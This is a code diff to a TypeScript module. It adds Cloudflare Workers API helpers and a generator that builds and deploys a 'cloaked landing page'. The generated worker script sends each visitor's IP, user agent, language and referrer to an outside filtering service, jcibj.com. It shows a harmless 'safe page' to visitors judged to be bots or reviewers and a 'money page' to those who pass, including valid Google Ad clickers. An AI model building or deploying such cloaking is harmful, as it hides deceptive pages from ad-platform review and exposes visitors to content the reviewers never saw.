@@ -185,6 +185,143 @@ const cf = {
     const data = await response.json();
     return data.result || [];
   },
+
+  // Cloudflare Workers API methods
+  async createWorker(scriptName: string, scriptContent: string) {
+    // In development with missing credentials, return mock success
+    if (isDevelopment && (!process.env.CLOUDFLARE_API_TOKEN || !process.env.CLOUDFLARE_ACCOUNT_ID)) {
+      return {
+        success: true,
+        result: {
+          id: 'mock-worker-id',
+          script: scriptName
+        }
+      };
+    }
+
+    if (!CLOUDFLARE_ACCOUNT_ID) {
+      throw new Error('Cloudflare account ID is required to create workers');
+    }
+
+    const response = await fetch(`https://api.cloudflare.com/client/v4/accounts/${CLOUDFLARE_ACCOUNT_ID}/workers/scripts/${scriptName}`, {
+      method: 'PUT',
+      headers: {
+        'Content-Type': 'application/javascript',
+        'Authorization': `Bearer ${CLOUDFLARE_API_TOKEN}`,
+      },
+      body: scriptContent,
+    });
+    return response.json();
+  },
+
+  async updateWorker(scriptName: string, scriptContent: string) {
+    // In development with missing credentials, return mock success
+    if (isDevelopment && (!process.env.CLOUDFLARE_API_TOKEN || !process.env.CLOUDFLARE_ACCOUNT_ID)) {
+      return {
+        success: true,
+        result: {
+          id: 'mock-worker-id',
+          script: scriptName
+        }
+      };
+    }
+
+    if (!CLOUDFLARE_ACCOUNT_ID) {
+      throw new Error('Cloudflare account ID is required to update workers');
+    }
+
+    const response = await fetch(`https://api.cloudflare.com/client/v4/accounts/${CLOUDFLARE_ACCOUNT_ID}/workers/scripts/${scriptName}`, {
+      method: 'PUT',
+      headers: {
+        'Content-Type': 'application/javascript',
+        'Authorization': `Bearer ${CLOUDFLARE_API_TOKEN}`,
+      },
+      body: scriptContent,
+    });
+    return response.json();
+  },
+
+  async deleteWorker(scriptName: string) {
+    // In development with missing credentials, return mock success
+    if (isDevelopment && (!process.env.CLOUDFLARE_API_TOKEN || !process.env.CLOUDFLARE_ACCOUNT_ID)) {
+      return {
+        success: true
+      };
+    }
+
+    if (!CLOUDFLARE_ACCOUNT_ID) {
+      throw new Error('Cloudflare account ID is required to delete workers');
+    }
+
+    const response = await fetch(`https://api.cloudflare.com/client/v4/accounts/${CLOUDFLARE_ACCOUNT_ID}/workers/scripts/${scriptName}`, {
+      method: 'DELETE',
+      headers: {
+        'Authorization': `Bearer ${CLOUDFLARE_API_TOKEN}`,
+      },
+    });
+    return response.json();
+  },
+
+  async createWorkerRoute(zoneId: string, pattern: string, scriptName: string) {
+    // In development with missing credentials, return mock success
+    if (isDevelopment && (!process.env.CLOUDFLARE_API_TOKEN)) {
+      return {
+        success: true,
+        result: {
+          id: 'mock-route-id',
+          pattern: pattern,
+          script: scriptName
+        }
+      };
+    }
+
+    const response = await fetch(`https://api.cloudflare.com/client/v4/zones/${zoneId}/workers/routes`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Authorization': `Bearer ${CLOUDFLARE_API_TOKEN}`,
+      },
+      body: JSON.stringify({
+        pattern: pattern,
+        script: scriptName
+      }),
+    });
+    return response.json();
+  },
+
+  async deleteWorkerRoute(zoneId: string, routeId: string) {
+    // In development with missing credentials, return mock success
+    if (isDevelopment && (!process.env.CLOUDFLARE_API_TOKEN)) {
+      return {
+        success: true
+      };
+    }
+
+    const response = await fetch(`https://api.cloudflare.com/client/v4/zones/${zoneId}/workers/routes/${routeId}`, {
+      method: 'DELETE',
+      headers: {
+        'Authorization': `Bearer ${CLOUDFLARE_API_TOKEN}`,
+      },
+    });
+    return response.json();
+  },
+
+  async listWorkerRoutes(zoneId: string) {
+    // In development with missing credentials, return mock data
+    if (isDevelopment && (!process.env.CLOUDFLARE_API_TOKEN)) {
+      return {
+        success: true,
+        result: []
+      };
+    }
+
+    const response = await fetch(`https://api.cloudflare.com/client/v4/zones/${zoneId}/workers/routes`, {
+      headers: {
+        'Authorization': `Bearer ${CLOUDFLARE_API_TOKEN}`,
+      },
+    });
+    return response.json();
+  }
 };
 
 export type CloudflareNameserver = string;
@@ -527,5 +664,224 @@ export async function checkAndFixDnsSettings(domainName: string, zoneId?: string
   } catch (error) {
     console.error(`[${new Date().toISOString()}] checkAndFixDnsSettings: Error checking/fixing DNS settings for ${domainName}:`, error);
     return { success: false, error };
+  }
+}
+
+// Helper function to generate JCI API worker script
+export function generateJciWorkerScript(options: {
+  safeUrl: string;
+  moneyUrl: string;
+  targetCountries: string[];
+  excludeCountries?: string[];
+}): string {
+  const { safeUrl, moneyUrl, targetCountries, excludeCountries = [] } = options;
+  
+  return `// JCI API Cloaking Script for Cloudflare Workers
+// Generated automatically by Webpage Creator
+
+// --- CONFIGURATION ---
+const JCI_USER_ID = 'e68rqs0to5i24lfzpov5je9mr'; 
+const SAFE_URL = '${safeUrl}'; 
+const MONEY_URL = '${moneyUrl}'; 
+const TARGET_COUNTRIES = ${JSON.stringify(targetCountries)};
+const EXCLUDE_COUNTRIES = ${JSON.stringify(excludeCountries)};
+// --- END CONFIGURATION ---
+
+export default {
+  async fetch(request) {
+    try {
+      // Step 1: Gather all visitor data from Cloudflare's request headers
+      const data = {
+        ip:       request.headers.get('CF-Connecting-IP') || '',
+        ua:       request.headers.get('User-Agent') || '',
+        lan:      request.headers.get('Accept-Language') || '',
+        ref:      request.headers.get('Referer') || '',
+        
+        // --- ADVANCED POST FILTERS ---
+        inc_loc:  TARGET_COUNTRIES.join(','), // Target specific countries
+        ex_loc:   EXCLUDE_COUNTRIES.join(','), // Exclude specific countries if needed
+        devices:  '',        // Leave empty to allow all devices (Mobile, Computers, etc.)
+        os:       '',        // Leave empty to allow all OS (Windows, iOS, etc.)
+        lans:     '',        // Leave empty to allow all languages
+        is_geo:   true,      // Enable Geo-location checks
+        is_device:true,      // Enable Device checks
+        is_os:    true,      // Enable OS checks
+        is_lang:  true,      // Enable Language checks
+        is_gclid: true,      // CRITICAL: Set to true to filter for valid Google Ad clicks
+        ipscore:  true       // CRITICAL: Set to true to use their most powerful IP analysis
+      };
+
+      // Step 2: Call the JCI API using the POST method for advanced filtering
+      const jciApiUrl = \`https://jcibj.com/lapi/rest/r/\${JCI_USER_ID}\`;
+      
+      const apiResponse = await fetch(jciApiUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: new URLSearchParams(data).toString()
+      });
+
+      if (!apiResponse.ok) {
+        // If the API call fails, always show the safe page as a fallback
+        return fetch(SAFE_URL);
+      }
+
+      const jciResult = await apiResponse.json();
+
+      // Step 3: Analyze the API response and make the decision
+      // From the docs: 'type' == 'false' means PASS (show Money Page)
+      // 'type' == 'true' means BLOCK (show Safe Page)
+      if (jciResult.type === 'false' || jciResult.status === 'passed') {
+        // The visitor is clean. Show them the Money Page.
+        return fetch(MONEY_URL);
+      } else {
+        // The visitor is a bot/reviewer. Show them the Safe Page.
+        return fetch(SAFE_URL);
+      }
+
+    } catch (error) {
+      // If any error occurs during the process, ALWAYS default to showing the Safe Page.
+      // This is your most important safety net.
+      return fetch(SAFE_URL);
+    }
+  },
+};`;
+}
+
+// Helper function to create a simple "Coming Soon" page
+export function generateComingSoonPage(): string {
+  return `<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Coming Soon</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+        }
+        .container {
+            text-align: center;
+            padding: 2rem;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            font-size: 3rem;
+            margin-bottom: 1rem;
+            background: linear-gradient(45deg, #fff, #f0f0f0);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        p {
+            font-size: 1.2rem;
+            margin-bottom: 2rem;
+            opacity: 0.9;
+        }
+        .loader {
+            width: 50px;
+            height: 50px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-top: 3px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        @media (max-width: 768px) {
+            h1 { font-size: 2rem; }
+            p { font-size: 1rem; }
+            .container { margin: 1rem; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Coming Soon</h1>
+        <p>We're working on something amazing. Stay tuned!</p>
+        <div class="loader"></div>
+    </div>
+</body>
+</html>`;
+}
+
+// Main function to create a cloaked landing page with Cloudflare Worker
+export async function createCloakedLandingPage(options: {
+  domain: any;
+  subdomain?: string;
+  moneyUrl: string;
+  targetCountries: string[];
+  excludeCountries?: string[];
+  safePageContent?: string;
+}) {
+  const { domain, subdomain, moneyUrl, targetCountries, excludeCountries, safePageContent } = options;
+  
+  try {
+    // 1. Generate safe page URL (we'll deploy the coming soon page to Vercel first)
+    const safePageDomain = subdomain && domain.dnsManagement !== 'external' 
+      ? `${subdomain}.${domain.name}` 
+      : domain.name;
+    const safeUrl = `https://${safePageDomain}`;
+    
+    // 2. Generate unique worker script name
+    const scriptName = `cloak-${domain.name.replace(/\./g, '-')}-${Date.now()}`;
+    
+    // 3. Generate JCI worker script
+    const workerScript = generateJciWorkerScript({
+      safeUrl,
+      moneyUrl,
+      targetCountries,
+      excludeCountries
+    });
+    
+    // 4. Deploy worker to Cloudflare
+    console.log(`Creating worker script: ${scriptName}`);
+    const workerResult = await cf.createWorker(scriptName, workerScript);
+    
+    if (!workerResult.success) {
+      throw new Error(`Failed to create worker: ${JSON.stringify(workerResult.errors)}`);
+    }
+    
+    // 5. Create worker route
+    const routePattern = subdomain && domain.dnsManagement !== 'external'
+      ? `${subdomain}.${domain.name}/*`
+      : `${domain.name}/*`;
+      
+    console.log(`Creating worker route: ${routePattern} -> ${scriptName}`);
+    const routeResult = await cf.createWorkerRoute(domain.cloudflareZoneId, routePattern, scriptName);
+    
+    if (!routeResult.success) {
+      throw new Error(`Failed to create worker route: ${JSON.stringify(routeResult.errors)}`);
+    }
+    
+    return {
+      success: true,
+      workerScriptName: scriptName,
+      workerRouteId: routeResult.result.id,
+      safeUrl,
+      routePattern,
+      message: `Cloaked landing page deployed successfully. Worker route: ${routePattern}`
+    };
+    
+  } catch (error) {
+    console.error('Error creating cloaked landing page:', error);
+    throw error;
   }
 }
